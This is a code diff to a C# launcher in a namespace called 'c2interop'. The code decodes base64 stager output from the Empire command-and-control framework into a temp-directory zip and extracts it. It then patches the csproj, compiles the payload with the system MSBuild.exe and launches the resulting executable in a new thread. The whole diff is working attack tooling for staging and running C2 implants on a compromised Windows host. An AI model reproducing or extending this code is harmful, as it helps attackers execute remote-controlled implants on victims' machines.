@@ -17,6 +17,8 @@ namespace c2interop{
         [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
         private string ThreadFilename;
+        private string ThreadStartPath;
+
         public Launcher(){
 
         }
@@ -37,6 +39,18 @@ namespace c2interop{
             }
         }
 
+        private void fixCSProj(string pathToProject){
+            string data = "";
+
+            using (StreamReader reader = new StreamReader(pathToProject)){
+                data = reader.ReadToEnd();
+            }
+
+            using (StreamWriter writer = new StreamWriter(pathToProject)){
+                writer.Write(data.Replace("MSBuildToolsPath","MSBuildBinPath"));
+            }
+        }
+
         public bool UnZipBuildAndLaunchCSharpProject(string filename, stager s){
             if (s.output == null || s.output == ""){
                 Console.WriteLine("[!!] No stager data found to execute.");
@@ -44,8 +58,8 @@ namespace c2interop{
             }
 
             //The current payload from empire is a .Net 2 project, probably need to update this to 4.0, but for now blah
-            if (!File.Exists(@"c:\Windows\Microsoft.NET\Framework64\v2.0.50727\msbuild.exe")){
-                Console.WriteLine("[!!] Host doesn't have msbuild for .Net 2.0");
+            if (!File.Exists(@"c:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe")){
+                Console.WriteLine("[!!] Host doesn't have msbuild v4");
                 return false;
             }
 
@@ -57,19 +71,22 @@ namespace c2interop{
                 bw.Write(Convert.FromBase64String(s.output));
             }
 
-            //ZipFile.OpenRead(Path.Combine(Path.GetTempPath(), zipFileName));
+            //Unzip the payload to temp directory
             Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), unzipDir));
-            ZipFile.ExtractToDirectory(Path.Combine(Path.GetTempPath(), zipFileName),Path.Combine(Path.GetTempPath(),unzipDir));            
+            ZipFile.ExtractToDirectory(Path.Combine(Path.GetTempPath(), zipFileName),Path.Combine(Path.GetTempPath(),unzipDir));
 
-            Pause();
+            //Fix up the CS Project the path to Microsoft.CSharp.targets should be $(MSBuildBinPath) iso $(MSBuildToolsPath) if there's no visual studio install
+            //Well, thats a wild guess, i dont know shit
+            fixCSProj(Path.Combine(Path.GetTempPath(),unzipDir,"cmd","cmd.csproj"));
 
             if(runMSBUILD(Path.Combine(Path.GetTempPath(),unzipDir,"cmd"))){
-                ThreadFilename = Path.Combine(Path.GetTempPath(),unzipDir,"bin/Debug/cmd.exe");
-                Thread t = new Thread(new ThreadStart(StartCMDEXEProcess));
+                
+                ThreadFilename = Path.Combine(Path.GetTempPath(),unzipDir,"cmd","bin","Debug","cmd.exe");
+                ThreadStartPath = Path.Combine(Path.GetTempPath(),unzipDir,"cmd","bin","Debug");
+
+                Thread t = new Thread(new ThreadStart(StartEXEProcess));
                 t.Start();
             }
-
-            Pause();
 
             return true;    
         }
@@ -81,7 +98,8 @@ namespace c2interop{
                 return false;
             }
 
-            ThreadFilename = @"c:\Windows\Microsoft.NET\Framework64\v2.0.50727\msbuild.exe " + projectFiles[0];
+            ThreadStartPath = PathToProject;
+            ThreadFilename = @"c:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe " + projectFiles[0];
             StartCMDEXEProcess();
 
             return true;
@@ -118,11 +136,35 @@ namespace c2interop{
             return true;
         }
 
+        private void StartEXEProcess(){
+            //For now...
+            //Console.WriteLine("Executing: " + ThreadFilename);
+            //Console.WriteLine("Using StartPath: " + ThreadStartPath);
+
+            ProcessStartInfo psi = new ProcessStartInfo(ThreadFilename);
+            psi.UseShellExecute = false;
+
+            if (ThreadStartPath != null && ThreadStartPath != ""){
+                psi.WorkingDirectory = ThreadStartPath;
+            }
+
+            Process p = Process.Start(psi);
+        }
+
         private void StartCMDEXEProcess(){
             //For now...
+            //Console.WriteLine("Executing cmd.exe /c " + ThreadFilename);
+            //Console.WriteLine("Using StartPath: " + ThreadStartPath);
+
             ProcessStartInfo psi = new ProcessStartInfo("cmd.exe","/c " + ThreadFilename);
             psi.UseShellExecute = true;
+
+            if (ThreadStartPath != null && ThreadStartPath != ""){
+                psi.WorkingDirectory = ThreadStartPath;
+            }
+
             Process p = Process.Start(psi);
+            p.WaitForExit();
         }
 
         private void StartDLLProcess(){
